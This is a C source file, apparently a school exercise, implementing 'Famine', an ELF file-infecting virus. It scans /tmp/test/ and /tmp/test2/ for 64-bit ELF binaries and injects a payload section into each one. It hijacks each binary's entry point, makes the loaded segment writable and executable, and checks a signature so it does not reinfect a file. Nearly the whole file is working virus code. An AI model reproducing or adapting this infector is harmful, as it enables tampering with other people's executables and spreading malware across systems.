/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
/*   Updated: 2018/06/20 23:36:23 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <elf.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "ft_printf.h"

#define OPEN		2
#define CLOSE		3
#define LSEEK		8
#define MMAP		9
#define MUNMAP		11
#define UNLINK		87
#define GETDENTS64	217

void			find_files(char *dir);
void			get_dat_elf(char *dir, char *file);
void			pack_dat_elf(char *path, int size, char *data);
int				dat_elf_is_infected(char *data, Elf64_Shdr *sec);
void			famine64_func(void);
extern uint32_t	famine64_size;
extern uint32_t	famine64_data;

struct linux_dirent64 {
	ino_t          d_ino;    /* 64-bit inode number */
	off_t          d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char  d_type;   /* File type */
	char           d_name[]; /* Filename (null-terminated) */
};

int main(int ac, char **av)
{
	char	*direct[] = { "/tmp/test/", "/tmp/test2/" };

	printf("%ld %ld %ld %ld\n", sizeof(ino_t), sizeof(off_t), sizeof(unsigned short), sizeof(unsigned char));
	find_files(direct[0]);
	find_files(direct[1]);
	return 0;
}

void	find_files(char *dir)
{
	int		fd;
	char	buff[1024];
	int		ret;
	int		off;
	
	fd = syscall(OPEN, dir, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC, 0);
	if (fd == -1)
		return ;
	while ((ret = syscall(GETDENTS64, fd, buff, 1024)) > 0)
	{
		off = 0;
		while (off < ret)
		{
			struct linux_dirent64 *linux64 = (struct linux_dirent64 *)(buff + off);
			if (linux64->d_type == DT_REG)
				get_dat_elf(dir, linux64->d_name);
			off += linux64->d_reclen;
		}
	}
	syscall(CLOSE, fd);
}

void	get_dat_elf(char *dir, char *file)
{
	char	path[1024];
	int		fd;
	int		size;
	void	*data;
	int		i;
	int		j;

	i = 0;
	while (dir[i])
	{
		path[i] = dir[i];
		i++;
	}
	j = 0;
	while (file[j])
	{
		path[i + j] = file[j];
		j++;
	}
	path[i + j] = '\0';
	fd = syscall(OPEN, path, O_RDWR|O_NONBLOCK, 0);
	if (fd == -1)
		return ;
	size = syscall(LSEEK, fd, 1, SEEK_END);
	if (size <= 0x40) // sizeof(Elf64_Ehdr)
	{
		syscall(CLOSE, fd);
		return ;
	}
	data = (void *)syscall(MMAP, NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (data == MAP_FAILED)
	{
		syscall(CLOSE, fd);
		return ;
	}
	syscall(CLOSE, fd);
	pack_dat_elf(path, size, data);
	syscall(MUNMAP, data, size);
}

void		pack_dat_elf(char *path, int size, char *data)
{
	printf("file: %s \\ ", path);
	if (data[0] == 0x7f && data[1] == 'E' && data[2] == 'L' && data[3] == 'F' &&
		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3))
	{
		/* 1. Find the last PT_LOAD segment */
		size_t	phoff = ((Elf64_Ehdr *)data)->e_phoff;
		Elf64_Phdr *program = (Elf64_Phdr *)(data + phoff);
		Elf64_Phdr *iprogram = NULL;
		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++) {
			if (program[i].p_type == PT_LOAD) {
				iprogram = &program[i];
			}
		}
		if (iprogram == NULL) /* Weird if its NULL */
			return ;

		/* 2. Find the last section of the last PT_LOAD */
		size_t	shoff = ((Elf64_Ehdr *)data)->e_shoff;
		Elf64_Shdr *section = (Elf64_Shdr *)(data + shoff);
		Elf64_Shdr *isection = section;
		int			isectionnb = 0;
		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
			if (section[i].sh_addr > isection->sh_addr) {
				isection = &section[i];
				isectionnb = i;
			}
		}
		if (isection == NULL) /* Weird if its NULL */
			return ;

		if (dat_elf_is_infected(data, isection))
			return ;
		Elf64_Shdr newsect;
		newsect.sh_name = 0;
		newsect.sh_type = SHT_PROGBITS;
		newsect.sh_flags = 0x6;
		newsect.sh_addr = iprogram->p_vaddr - iprogram->p_offset + isection->sh_offset + isection->sh_size;
		newsect.sh_offset = isection->sh_offset + isection->sh_size;
		newsect.sh_size = famine64_size;
		newsect.sh_link = 0;
		newsect.sh_info = 0;
		newsect.sh_addralign = 0x10;
		newsect.sh_entsize = 0;

		syscall(UNLINK, path); /* Erase the file from system tree */

		/* 3. Modify sections offset higher than where we will wrote our code */
		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
			if (section[i].sh_offset >= iprogram->p_offset + iprogram->p_filesz &&
				&section[i] != isection) {
				section[i].sh_offset += isection->sh_size + famine64_size;
				if (section[i].sh_link > isectionnb)
					section[i].sh_link += 1;
			}
		}

		/* 4. Change the elf header */
		Elf64_Addr old_entry = ((Elf64_Ehdr *)data)->e_entry;
		((Elf64_Ehdr *)data)->e_entry = newsect.sh_addr;
		((Elf64_Ehdr *)data)->e_shoff += isection->sh_size + famine64_size;
		((Elf64_Ehdr *)data)->e_shnum += 1;
		((Elf64_Ehdr *)data)->e_shstrndx += 1;

		/* 5. Change the program header */
		/* Make our segment readable and executable if he's not */
		iprogram->p_flags |= PF_R;
		iprogram->p_flags |= PF_W;
		iprogram->p_flags |= PF_X;
		iprogram->p_memsz += isection->sh_size + famine64_size;
		iprogram->p_filesz = iprogram->p_memsz;
		while (iprogram->p_align < newsect.sh_offset + famine64_size)
			iprogram->p_align += getpagesize();

		/* Re-create the file */
		/* Nicer way will be to get the file permissions and assign 'em like it was */
		int fd = syscall(OPEN, path, O_WRONLY|O_CREAT, 0755);
		if (fd == -1) {
			write(1, "OPEN file failed\n", 17);
			return ;
		}

		/* Re-write the file */
		size_t off = isection->sh_offset;
		if (write(fd, data, off) < 0)
			return ;
		for (uint32_t i = 0; i < isection->sh_size; i++)
			write(fd, "\0", 1);
		if (write(fd, &famine64_func, famine64_size - sizeof(old_entry)) < 0)
			return ;
		Elf64_Addr jump = old_entry - newsect.sh_addr;
		if (write(fd, &jump, sizeof(jump)) < 0)
			return ;
		size_t off2 = (uint64_t)isection - (uint64_t)data + sizeof(*isection);
		write(fd, data + off, off2 - off);
		write(fd, &newsect, sizeof(newsect));
		off = off2;
		write(fd, data + off, size - off - 1);
		syscall(CLOSE, fd);
	}
}

int		dat_elf_is_infected(char *data, Elf64_Shdr *sec)
{
	uint64_t signature = *(uint64_t *)(data + sec->sh_offset + sec->sh_size - 16);
	printf("%#llx\n", signature);
	if (((Elf64_Ehdr *)data)->e_ident[EI_DATA] == 1) // Little-endian
		return (signature == 0x24EFAC2442CAFE42);
	return (signature == 0x42CAFE4224EFAC24);
}

/*
		typedef struct
		{
16			unsigned char e_ident[EI_NIDENT];
2			Elf64_Half    e_type;
2			Elf64_Half    e_machine;
4			Elf64_Word    e_version;
8			Elf64_Addr    e_entry;
8			Elf64_Off e_phoff;
8			Elf64_Off e_shoff;
4			Elf64_Word    e_flags;
2			Elf64_Half    e_ehsize;
2			Elf64_Half    e_phentsize;
2			Elf64_Half    e_phnum;
2			Elf64_Half    e_shentsize;
2			Elf64_Half    e_shnum;
2			Elf64_Half    e_shstrndx;
		} Elf64_Ehdr;

		typedef struct
		{
4			Elf64_Word    p_type;
4			Elf64_Word    p_flags;
8			Elf64_Off     p_offset;
8			Elf64_Addr    p_vaddr;
8			Elf64_Addr    p_paddr;
8			Elf64_Xword   p_filesz;
8			Elf64_Xword   p_memsz;
8			Elf64_Xword   p_align;
56		} Elf64_Phdr;

		typedef struct
		{
4			Elf64_Word    sh_name;
4			Elf64_Word    sh_type;
8			Elf64_Xword   sh_flags;
8			Elf64_Addr    sh_addr;
8			Elf64_Off     sh_offset;
8			Elf64_Xword   sh_size;
4			Elf64_Word    sh_link;
4			Elf64_Word    sh_info;
8			Elf64_Xword   sh_addralign;
8			Elf64_Xword   sh_entsize;
64		} Elf64_Shdr;
*/
